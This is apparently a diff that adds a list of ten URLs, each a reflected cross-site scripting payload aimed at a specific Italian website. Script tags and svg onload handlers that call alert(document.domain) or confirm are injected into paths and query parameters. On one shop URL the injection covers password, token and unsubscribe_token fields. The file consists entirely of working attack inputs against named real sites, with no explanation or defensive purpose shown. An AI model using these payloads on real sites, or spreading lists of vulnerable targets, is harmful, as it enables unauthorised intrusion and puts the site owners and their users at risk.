@@ -1,0 +1,10 @@
+http://bogenservice.it/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://bolognacolors.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://brianzatendegarlate.it/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://cattolicadeigreci.it/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://cdn02.stardata.it/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://cdn03.imgr.it/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://centrim.it/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://cdn03.stardata.it/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+https://cdn.imgr.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://cdn.lombardoshop.it/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
